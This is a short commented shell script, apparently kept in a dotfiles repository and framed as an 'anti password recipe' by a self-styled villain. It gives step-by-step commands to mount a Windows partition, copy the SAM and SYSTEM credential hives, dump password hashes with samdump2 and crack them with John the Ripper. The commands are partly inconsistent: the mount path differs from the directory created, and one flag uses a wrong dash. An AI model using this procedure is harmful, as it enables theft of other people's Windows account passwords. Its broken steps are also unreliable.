#                                                   ██
#                           ██████                 ░██
#  ██████ ██████████       ░██░░░██ ███     ██     ░██
# ░░██░░█░░██░░██░░██ █████░██  ░██░░██  █ ░██  ██████
#  ░██ ░  ░██ ░██ ░██░░░░░ ░██████  ░██ ███░██ ██░░░██
#  ░██    ░██ ░██ ░██      ░██░░░   ░████░████░██  ░██
# ░███    ███ ░██ ░██      ░██      ███░ ░░░██░░██████
# ░░░    ░░░  ░░  ░░       ░░      ░░░    ░░░  ░░░░░░
#
#  ▓▓▓▓▓▓▓▓▓▓
# ░▓ author ▓ ROGUE(X3) <rowanfeely.github.io>
# ░▓   code ▓ https://github.com/RowanFeely/dotfiles
# ░▓▓▓▓▓▓▓▓▓▓
# ░░░░░░░░░░

# AN ANTI PASSWORD RECIPE BY YOUR FAVORITE INTERNET VILLAIN ROGUETHREETIMES

# Check for the partition where windows is installed
fdisk -l
# looking at the partition sizes you can determine where the OS is installed eg. /dev/sda2

# Create directory with
mkdir /mnt/CDrive

# Mount the hard drive partition /dev/sda2 to CDrive directory using
mount /dev/sda2 /mnt/tmp/CDrive

# Check mount point using
ls -ltr /mnt/tmp/CDrive

# then
mount
# to check the mounted drive.

# /dev/sda2 on /mnt/CDrive type fuseblk (rw,relatime,user_id=0,group_id=0,allow_other,blksize=4096)
# In the above output, last line shows that target hard disk partition has been mounted to CDrive directory.

# Now to copy your precious SAM files
# create directory
mkdir /tmp/temp
cp /mnt/CDrive/Windows/System32/config/SAM /tmp/temp

# Samdump2 fetches the SYSKEY and extract hashes from windows SAM file.
# For installing the samdump2 type sudo apt-get update after then type sudo apt-get install samdump2.

# Now copy the SYSKEY file
cp /mnt/CDrive/Windows/System32/config/SYSTEM /tmp/temp

samdump2 SYSTEM SAM
# samdump2 will show the hashes in SAM files.

# redirect the hash output to a file named hash.txt.
samdump2 SYSTEM SAM > hash.txt

# CRACK TIME WITH JOHN THE RIPPER
john –format=LM –wordlist=path/to/wordlist hash.txt
# big wordlist can be extracted from usr/share/wordlists/rockyou.txt.gz
